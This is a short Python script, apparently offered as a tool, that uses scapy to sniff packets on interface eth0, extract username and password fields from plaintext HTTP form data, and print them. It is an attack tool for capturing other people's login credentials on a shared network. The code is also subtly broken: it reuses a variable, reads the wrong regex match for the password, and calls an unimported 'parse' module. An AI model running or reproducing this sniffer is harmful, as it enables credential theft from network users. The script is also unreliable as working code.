from scapy.all import *
import re
import urllib

def get_login(body):
    user = None
    passwd = None

    userfields = ['log', 'login', 'username', 'Username']
    passwordfields = ['password', 'Password']
    for user in userfields:
        login_re = re.search('(%s=[^&]+)' % user, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    
    for password in passwordfields:
        passwd_re = re.search('(%s=[^&]+)' % password, body, re.IGNORECASE)
        if passwd_re:
            passwd = login_re.group()
    if user and passwd:
        return(user, passwd)

    
def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_passwd = get_login(body)
        if user_passwd != None:
            print(parse.unquote(user_passwd[0]))
            print(parse.unquote(user_passwd[1]))
    pass

    
iface = 'eth0'
try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Cancelling...')
    exit(0)
